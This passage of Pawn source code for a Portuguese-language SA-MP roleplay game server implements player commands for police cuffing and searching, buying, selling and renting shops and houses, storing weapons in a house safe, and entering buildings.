	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	format(string, sizeof(string), "Drogas Encontradas: {FFFFFF}%d {52E3BA}| Materiais Encontrados: {FFFFFF}%d {52E3BA}| Total de Multas: {FFFFFF}%d", pInfo[giveplayerid][Drogas], pInfo[giveplayerid][Materiais], pInfo[giveplayerid][Multas]);
	SendClientMessage(playerid, COLOR_INFO, string);
	
	new Player_Weapons[13];
	new Player_Ammos[13];
	new i, counter;

	for(i = 1;i <= 12; i++)
	{
		GetPlayerWeaponData(giveplayerid, i, Player_Weapons[i], Player_Ammos[i]);
		if(Player_Weapons[i] != 0)
		{
			new weaponName[128];
			
			GetWeaponName(Player_Weapons[i], weaponName,255);
			
			format(string, 255, "Arma Encontrada: {FFFFFF}%s.", weaponName);
			SendClientMessage(playerid, COLOR_INFO, string);
			
			counter++;
		}
	}
	
	if(counter == 0) { SendClientMessage(playerid, COLOR_INFO, "Não foram encontradas armas"); }
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "revista");

	return 1;
}

COMMAND:desalgemar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");

	new giveplayerid, string[128];

	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/desalgemar <playerid>");

	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(Algemado[giveplayerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não está algemado");
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes desalgemar a ti próprio");
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");

	Algemado[giveplayerid] = false;

	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
	SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	
	RemovePlayerAttachedObject(giveplayerid, 0);
	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_NONE);

	format(string, sizeof(string), "Desalgemaste o jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Foste desalgemado por %s", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "desalgema");

	return 1;
}

COMMAND:algemar(playerid, params[], help)
{
	if(fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
	if(FactionDuty[playerid] == false && fInfo[pInfo[playerid][Faction]][UseDuty] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em duty");
	
	new giveplayerid, string[128];
	
	if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/algemar <playerid>");
	
	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
	if(Algemado[giveplayerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já está algemado");
	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes algemar a ti próprio");
	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
	
	Algemado[giveplayerid] = true;
	
	SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
	SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	
	format(string, sizeof(string), "Algemaste o jogador %s", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_INFO, string);
	format(string, sizeof(string), "Foste algemado por %s", GetPlayerNameEx(playerid));
	SendClientMessage(giveplayerid, COLOR_INFO, string);
	
	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "algema");

	return 1;
}

COMMAND:ajudaloja(playerid, params[], help)
{
	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS LOJA]: {FFFFFF}/comprarloja - /venderloja - /loja - /trancarloja");

	return 1;
}

COMMAND:trancarloja(playerid, params[], help)
{
    new bID = IsPlayerAtBizEntrance(playerid);

	if(pInfo[playerid][ChaveBiz] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma loja");
	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
	if(bInfo[bID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");
	if(pInfo[playerid][ChaveBiz] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa loja");

	if(bInfo[bID][Locked] == 0)
	{
	    bInfo[bID][Locked] = 1;

		SendClientMessage(playerid, COLOR_INFO, "Trancaste a tua loja");
		PlayerActionMessage(playerid, 15.0, "põe a chave na fechadura e fecha a loja.");
	}
	else
	{
	    bInfo[bID][Locked] = 0;

		SendClientMessage(playerid, COLOR_INFO, "Destrancaste a tua loja");
		PlayerActionMessage(playerid, 15.0, "põe a chave na fechadura e abre a loja.");
	}
	
	AtualizarBiz(bID);

	return 1;
}

COMMAND:loja(playerid, params[], help)
{
    new bID = GetPlayerVirtualWorld(playerid);

	if(pInfo[playerid][ChaveBiz] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma loja");
	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
	if(bInfo[bID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");
	if(pInfo[playerid][ChaveBiz] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa loja");
	
	new string[128], sdialog[512];
	
	format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Info Loja"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Mudar preço de entrada"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Mudar nome da loja"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Extrair"); strcat(sdialog,string);
	
	if(bInfo[bID][Type] == BTYPE_SEGURADORA)
	{
		format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Alterar mensalidade do seguro"); strcat(sdialog,string);
	}

	ShowPlayerDialog(playerid, DIALOG_LOJA_MENU, DIALOG_STYLE_LIST, "{FFFF00}MENU DA LOJA", sdialog, "Selecionar", "Sair");

	return 1;
}

COMMAND:ajudacasa(playerid, params[], help)
{
	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS CASA]: {FFFFFF}/comprarcasa - /vendercasa - /casa - /alugarcasa - /porarmacasa - /tirararmacasa - /abrircasa");

	return 1;
}

COMMAND:abrircasa(playerid, params[], help)
{
    new hID = IsPlayerAtHouseEntrance(playerid);
    
    if(hID == 0) hID = IsPlayerAtHouseExit(playerid);

	if(pInfo[playerid][ChaveCasa] != hID && pInfo[playerid][ChaveCasaAlugada] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não te pertence");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");

	if(hInfo[hID][Locked] == 0)
	{
        hInfo[hID][Locked] = 1;
        PlayerActionMessage(playerid, 15.0, "mete a chave na fechadura, roda a chave e fecha a porta.");
	}
	else
	{
        hInfo[hID][Locked] = 0;
        PlayerActionMessage(playerid, 15.0, "mete a chave na fechadura, roda a chave e abre a porta.");
	}

	return 1;
}

COMMAND:porarmacasa(playerid, params[], help)
{
    new hID = GetPlayerVirtualWorld(playerid);
    new slot;
    
    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/porarmacasa <slot>");

	if(pInfo[playerid][ChaveCasa] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma casa");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está comprada");
	if(pInfo[playerid][ChaveCasa] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa casa");
	if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido");
	
	new arma = GetPlayerWeapon(playerid);
	new ammo = GetPlayerAmmo(playerid);
	
	if(arma == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Arma inválida");
	if(ammo == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Munição inválida");
	
	switch(slot)
	{
	    case 1:
	    {
	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
	        
	        hInfo[hID][Arma1] = arma;
	        hInfo[hID][Ammo1] = ammo;
	    }
	    case 2:
	    {
	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
	        
	        hInfo[hID][Arma2] = arma;
	        hInfo[hID][Ammo2] = ammo;
	    }
	    case 3:
	    {
	        if(hInfo[hID][Ammo1] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma arma nesse slot");
	        
	        hInfo[hID][Arma3] = arma;
	        hInfo[hID][Ammo3] = ammo;
	    }
	}
	
	RemovePlayerWeapon(playerid, arma);
	
	PlayerActionMessage(playerid, 15.0, "abre o cofre e esconde uma arma lá dentro");

	return 1;
}

COMMAND:tirararmacasa(playerid, params[], help)
{
    new hID = GetPlayerVirtualWorld(playerid);
    new slot;
    new string[128];

    if(sscanf(params, "d", slot)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/tirararmacasa <slot>");

	if(pInfo[playerid][ChaveCasa] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma casa");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa Não está comprada");
	if(pInfo[playerid][ChaveCasa] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa casa");
	if(slot <= 0 || slot > 3) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Slot inválido");

	switch(slot)
	{
	    case 1:
	    {
	        if(hInfo[hID][Ammo1] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");
	        
	        GivePlayerWeapon(playerid, hInfo[hID][Arma1], hInfo[hID][Ammo1]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:1) com %d de munição", GetWeapName(hInfo[hID][Arma1]), hInfo[hID][Ammo1]);
	        
	        hInfo[hID][Arma1] = 0;
	        hInfo[hID][Ammo1] = 0;
	    }
	    case 2:
	    {
	        if(hInfo[hID][Ammo2] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, hInfo[hID][Arma2], hInfo[hID][Ammo2]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:2) com %d de munição", GetWeapName(hInfo[hID][Arma2]), hInfo[hID][Ammo2]);
	        
	        hInfo[hID][Arma2] = 0;
	        hInfo[hID][Ammo2] = 0;
	    }
	    case 3:
		{
	        if(hInfo[hID][Ammo3] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma nesse slot");

	        GivePlayerWeapon(playerid, hInfo[hID][Arma3], hInfo[hID][Ammo3]);
	        format(string, sizeof(string), "Tiraste a arma %s (Slot:3) com %d de munição", GetWeapName(hInfo[hID][Arma3]), hInfo[hID][Ammo3]);
	        
	        hInfo[hID][Arma3] = 0;
	        hInfo[hID][Ammo3] = 0;
		}
	}
	
	PlayerActionMessage(playerid, 15.0, "abre o cofre e tira uma arma lá de dentro");

	return 1;
}

COMMAND:casa(playerid, params[], help)
{
    new hID = GetPlayerVirtualWorld(playerid);

	if(pInfo[playerid][ChaveCasa] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma casa");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa Não está comprada");
	if(pInfo[playerid][ChaveCasa] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa casa");

	new string[128], sdialog[512];

	format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Info Casa"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Ativar/Desactivar aluguer"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Alterar preço de aluguer"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Depositar"); strcat(sdialog,string);
	format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Extrair"); strcat(sdialog,string);

	ShowPlayerDialog(playerid, DIALOG_CASA_MENU, DIALOG_STYLE_LIST, "{FFFF00}MENU DA CASA", sdialog, "Selecionar", "Sair");

	return 1;
}

COMMAND:venderloja(playerid, params[], help)
{
    new bID = IsPlayerAtBizEntrance(playerid);
   	new string[128];

	if(pInfo[playerid][ChaveBiz] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma loja");
	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
	if(bInfo[bID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está comprada");
	if(pInfo[playerid][ChaveBiz] != bID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa loja");
	
	GivePlayerMoneyEx(playerid, bInfo[bID][Price]/2);
	
	if(bInfo[bID][Bank] < 0)
	{
	    pInfo[playerid][Bank] += bInfo[bID][Bank];
	    
    	format(string, sizeof(string), "Tinhas dívidas da loja. Pagaste %d$.", bInfo[bID][Bank]);
		SendClientMessage(playerid, COLOR_INFO, string);
	}

	bInfo[bID][Comprada] = 0;
	bInfo[bID][Locked] = 0;
	bInfo[bID][Produtos] = 0;
	bInfo[bID][PickupID] = 1272;
	bInfo[bID][Entrada] = 0;
 	format(bInfo[bID][Nome], 32, "%s", "Unused");
  	format(bInfo[bID][Owner], 32, "%s", "Ninguém");
  	
  	pInfo[playerid][ChaveBiz] = 0;

	format(string, sizeof(string), "Vendeste a loja %d e recebeste %d$", bID, bInfo[bID][Price]/2);
	SendClientMessage(playerid, COLOR_INFO, string);
	
	return 1;
}

COMMAND:comprarloja(playerid, params[], help)
{
    new bID = IsPlayerAtBizEntrance(playerid);
    
	if(pInfo[playerid][ChaveBiz] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma loja");
	if(bID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma loja");
	if(bInfo[bID][Comprada] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja já foi comprada");
	if(bInfo[bID][Price] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não está configurada, contacta um administrador");
	if(GetPlayerMoneyEx(playerid) < bInfo[bID][Price]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	
	new string[128];
	
	bInfo[bID][Comprada] = 1;
	bInfo[bID][Locked] = 0;
	bInfo[bID][Produtos] = 10;
	bInfo[bID][PickupID] = 1318;
	bInfo[bID][Entrada] = 0;
 	format(bInfo[bID][Nome], 32, "%s", "Sem Nome");
  	format(bInfo[bID][Owner], 32, "%s", GetPlayerNameEx(playerid));
  	
  	GuardarBizz(bID);
  	AtualizarBiz(bID);
  	
  	pInfo[playerid][ChaveBiz] = bID;
  	GivePlayerMoneyEx(playerid, -bInfo[bID][Price]);
	
	format(string, sizeof(string), "Compraste a loja %d", bID);
	SendClientMessage(playerid, COLOR_INFO, string);
	
	PlayerActionMessage(playerid, 15.0, "acaba de preencher os papeis e recebe a chave da loja.");

	return 1;
}

COMMAND:vendercasa(playerid, params[], help)
{
    new hID = IsPlayerAtBizEntrance(playerid);

	if(pInfo[playerid][ChaveCasa] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma casa");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está comprada");
	if(pInfo[playerid][ChaveCasa] != hID) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário dessa casa");
    if(hInfo[hID][IsCaravana] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes vender essa casa");

	GivePlayerMoneyEx(playerid, hInfo[hID][Price]/2);

	new string[128];

	hInfo[hID][Comprada] = 0;
	hInfo[hID][Locked] = 1;
	hInfo[hID][Bank] = 0;
	hInfo[hID][PickupID] = 1273;
	hInfo[hID][AluguerStatus] = 0;
	hInfo[hID][Aluguer] = 0;
	hInfo[hID][Arma1] = 0;
	hInfo[hID][Ammo1] = 0;
	hInfo[hID][Arma2] = 0;
	hInfo[hID][Ammo2] = 0;
	hInfo[hID][Arma3] = 0;
	hInfo[hID][Ammo3] = 0;
	format(hInfo[hID][Nome], 32, "%s", "Unused");
	format(hInfo[hID][Owner], 32, "%s", "Ninguém");

  	pInfo[playerid][ChaveCasa] = 0;

	format(string, sizeof(string), "Vendeste a casa %d e recebeste %d$", hID, hInfo[hID][Price]/2);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:comprarcasa(playerid, params[], help)
{
    new hID = IsPlayerAtHouseEntrance(playerid);

	if(pInfo[playerid][ChaveCasa] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma casa");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa já foi comprada");
	if(hInfo[hID][Price] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está configurada, contacta um administrador");
	if(GetPlayerMoneyEx(playerid) < hInfo[hID][Price]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

	new string[128];

	hInfo[hID][Comprada] = 1;
	hInfo[hID][Locked] = 0;
	hInfo[hID][PickupID] = 19133;
	hInfo[hID][AluguerStatus] = 0;
	hInfo[hID][Aluguer] = 0;
	
 	format(hInfo[hID][Nome], 32, "%s", "Sem Nome");
  	format(hInfo[hID][Owner], 32, "%s", GetPlayerNameEx(playerid));

  	pInfo[playerid][ChaveCasa] = hID;
  	GivePlayerMoneyEx(playerid, -hInfo[hID][Price]);
  	
  	AtualizarCasa(hID);

	format(string, sizeof(string), "Compraste a loja %d", hID);
	SendClientMessage(playerid, COLOR_INFO, string);

	PlayerActionMessage(playerid, 15.0, "acaba de preencher os papéis e recebe a chave da casa.");

	return 1;
}

COMMAND:alugarcasa(playerid, params[], help)
{
    new hID = IsPlayerAtHouseEntrance(playerid);

	if(pInfo[playerid][ChaveCasaAlugada] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma casa alugada");
	if(hID == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma casa");
	if(hInfo[hID][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa Não está comprada");
	if(hInfo[hID][Price] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está configurada, contacta um administrador");
	if(GetPlayerMoneyEx(playerid) < hInfo[hID][Aluguer]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

	new string[128];

	pInfo[playerid][ChaveCasaAlugada] = hID;
	hInfo[hID][Bank] += hInfo[hID][Aluguer];
	
	format(string, sizeof(string), "Alugaste a casa %d", hID);
	SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:sair(playerid, params[], help)
{
	new bID = IsPlayerAtBizExit(playerid);

	if(bID != 0)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPosEx(playerid, bInfo[bID][EnterX], bInfo[bID][EnterY], bInfo[bID][EnterZ]+0.2);

		return 1;
	}
	
	new hID = IsPlayerAtHouseExit(playerid);
	
	if(hID != 0)
	{
	    if(hInfo[hID][IsCaravana] == 1 || hInfo[hID][IsCaravana] == 2)
	    {
	        new Float:x, Float:y, Float:z;
	        
	        if(GetVehicleSpeed(hInfo[hID][CarroCaravanaID]) > 5)
	        {
	            SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes sair agora da caravana, ela está em movimento!");
	            return 1;
	        }
	        
			if(hInfo[hID][IsCaravana] == 1)
			{
				GetVehicleRelativePos(hInfo[hID][CarroCaravanaID], x, y, z, 1.8, 0.3, -0.5); // journey 	    1.8 0.3 -0.5
			}
			else
			{
			    GetVehicleRelativePos(hInfo[hID][CarroCaravanaID], x, y, z, -0.7, -2.7, 1); // tropic 	    -0.5 -2.3 1
			}
	        
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPosEx(playerid, x, y, z+0.2);
			
	        return 1;
	    }
	    
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPosEx(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ]+0.2);

		return 1;
	}
	
	new buID = IsPlayerAtBuildingExit(playerid);
	
	if(buID != 0)
	{
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPosEx(playerid, buInfo[buID][EnterX], buInfo[buID][EnterY], buInfo[buID][EnterZ]+0.2);

		return 1;
	}

	return 1;
}

COMMAND:entrar(playerid, params[], help)
{
	new bID = IsPlayerAtBizEntrance(playerid);
	
	if(bID != 0)
	{
	    if(bInfo[bID][Locked] == 0)
	    {
			if(pInfo[playerid][ChaveBiz] != bID)
			{
			    if(GetPlayerMoneyEx(playerid) < bInfo[bID][Entrada]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

				new string[128];
			    
				GivePlayerMoneyEx(playerid, -bInfo[bID][Entrada]);
				bInfo[bID][Bank] += bInfo[bID][Entrada];
				
				format(string, sizeof(string), "Pagaste %d$ para entrares em %s", bInfo[bID][Entrada], bInfo[bID][Nome]);
				SendClientMessage(playerid, COLOR_INFO, string);
			}
			
			SetPlayerInterior(playerid, bInfo[bID][Interior]);
			SetPlayerVirtualWorld(playerid, bID);
			SetPlayerFacingAngle(playerid, bInfo[bID][ExitAngle]);

			SetPlayerPosEx(playerid, bInfo[bID][ExitX], bInfo[bID][ExitY], bInfo[bID][ExitZ]);
			
			switch(bInfo[bID][Type])
			{
			    //case BTYPE_RESTAURANTE: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comer"); }
			    //case BTYPE_BAR: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comprarbebida"); }
				//case BTYPE_247: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comprar - /catalogo"); }
				//case BTYPE_TELE: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comprartelemovel"); }
				//case BTYPE_STAND: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/catalogo - /comprarveiculo"); }
				//case BTYPE_CACA: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/catalogo"); }
				//case BTYPE_ROUPA: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/catalogo - /compraracessorio"); }
                //case BTYPE_FARMACIA: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comprar"); }
                case BTYPE_APOSTAS: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/euromilhoes"); }
                //case BTYPE_SEGURADORA: { new string[128]; format(string, sizeof(string), "[Comandos:] {FFFFFF}/assinarcontrato (%d$ por més, %d$ pelo contrato) - /acabarcontrato", bInfo[bID][Seguradora], PRECO_CONTSEGURADORA); SendClientMessage(playerid, COLOR_CHAT, string); }
			}
			return 1;
	    }
	    else
	    {
	        GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
	        return 1;
	    }
	}
	
	new hID = IsPlayerAtHouseEntrance(playerid);
	
	if(hID != 0)
	{
	    if(hInfo[hID][Locked] == 0)
	    {
			SetPlayerInterior(playerid, hInfo[hID][Interior]);
			SetPlayerVirtualWorld(playerid, hID);
			SetPlayerFacingAngle(playerid, hInfo[hID][ExitAngle]);

			SetPlayerPosEx(playerid, hInfo[hID][ExitX], hInfo[hID][ExitY], hInfo[hID][ExitZ]);
			
			return 1;
	    }
 	    else
	    {
	        GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
	        return 1;
	    }
	}
	
	new buID = IsPlayerAtBuildingEntrance(playerid);
	
	if(buID != 0)
	{
	    if(buInfo[buID][Locked] == 0)
	    {
			SetPlayerVirtualWorld(playerid, buID);
			SetPlayerInterior(playerid, buInfo[buID][Interior]);
			SetPlayerFacingAngle(playerid, buInfo[buID][ExitAngle]);
			SetPlayerVirtualWorld(playerid, buID);

			SetPlayerPosEx(playerid, buInfo[buID][ExitX], buInfo[buID][ExitY], buInfo[buID][ExitZ]);

			return 1;
	    }
 	    else
	    {
	        GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
	        return 1;
	    }
	}
	
	if(pInfo[playerid][Faction] == 0 && pInfo[playerid][Admin] == 0) return 1;
	
	if(fInfo[pInfo[playerid][Faction]][Type] == F_POLICIA || pInfo[playerid][Admin] != 0) // GARAGEM DOS APREENDIDOS
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ]))
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        {
	            new car = GetPlayerVehicleID(playerid);

				SetPlayerInterior(playerid, oInfo[0][ApreendidosInterior]);
				SetPlayerVirtualWorld(playerid, oInfo[0][ApreendidosVirtualWorld]);

				SetVehiclePosEx(car, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ]);
				SetVehicleZAngle(car, oInfo[0][ApreendidosA]);
	        }
	        else
	        {
				SetPlayerInterior(playerid, oInfo[0][ApreendidosInterior]);
				SetPlayerVirtualWorld(playerid, oInfo[0][ApreendidosVirtualWorld]);
				SetPlayerPosEx(playerid, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ]);
			}

            //IsInGaragemPSP[playerid] = true;
            
	        return 1;
	    }
		else if(IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ]))
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        {
	            new car = GetPlayerVehicleID(playerid);

	 			SetPlayerInterior(playerid, oInfo[0][EntradaApreendidosInterior]);
				SetPlayerVirtualWorld(playerid, oInfo[0][EntradaApreendidosVirtualWorld]);

